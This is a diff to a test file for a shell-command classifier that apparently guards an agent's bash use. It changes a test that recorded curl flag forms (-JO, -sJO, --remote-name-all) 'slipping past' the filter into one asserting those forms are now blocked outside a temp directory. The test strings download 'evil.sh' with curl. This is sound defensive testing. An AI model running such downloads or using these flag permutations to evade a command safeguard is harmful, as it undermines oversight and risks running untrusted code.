@@ -5846,12 +5846,12 @@ test("classifyBashCommand allows curl -O (remote-name) inside temp cwd", () => {
 	assert.equal(isDirect("curl --remote-name http://example.com/evil.sh", tmp), true, "--remote-name allowed when cwd is temp");
 });
 
-test("classifyBashCommand documents current curl L2 limitation forms", () => {
+test("classifyBashCommand blocks curl remote-name flag permutations outside temp", () => {
 	const tmp = os.tmpdir();
-	assert.equal(isDirect("curl -JO http://example.com/evil.sh"), true, "-JO currently slips past L2");
-	assert.equal(isDirect("curl -sJO http://example.com/evil.sh"), true, "-sJO currently slips past L2");
-	assert.equal(isDirect("curl --remote-name-all http://example.com/evil.sh"), true, "--remote-name-all currently slips past L2");
-	assert.equal(isDirect("curl -JO http://example.com/evil.sh", tmp), true, "limitation also remains allowed in temp cwd");
+	assert.equal(isBlocked("curl -JO http://example.com/evil.sh"), true, "-JO now blocked outside temp");
+	assert.equal(isBlocked("curl -sJO http://example.com/evil.sh"), true, "-sJO now blocked outside temp");
+	assert.equal(isBlocked("curl --remote-name-all http://example.com/evil.sh"), true, "--remote-name-all now blocked outside temp");
+	assert.equal(isDirect("curl -JO http://example.com/evil.sh", tmp), true, "same forms remain allowed when cwd is temp");
 });
 
 test("classifyBashCommand blocks curl -O even with explicit -o temp path", () => {
